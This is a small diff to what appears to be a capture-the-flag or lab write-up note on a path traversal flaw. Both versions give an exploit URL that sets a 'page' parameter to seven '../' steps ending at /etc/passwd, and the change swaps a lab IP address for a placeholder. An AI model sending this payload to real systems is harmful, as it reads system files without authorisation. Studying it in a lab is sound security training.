@@ -1,3 +1,4 @@
-Change the 'page' parameter in the URL to access password file stored outside of the web root folder (with at least 7 '../')
+Change the 'page' parameter in the URL to access password file 
+stored outside of the web root folder (with at least 7 '../').
 
-URL: http://10.13.0.186/index.php?page=../../../../../../../etc/passwd
+URL: http://<ip>/index.php?page=../../../../../../../etc/passwd
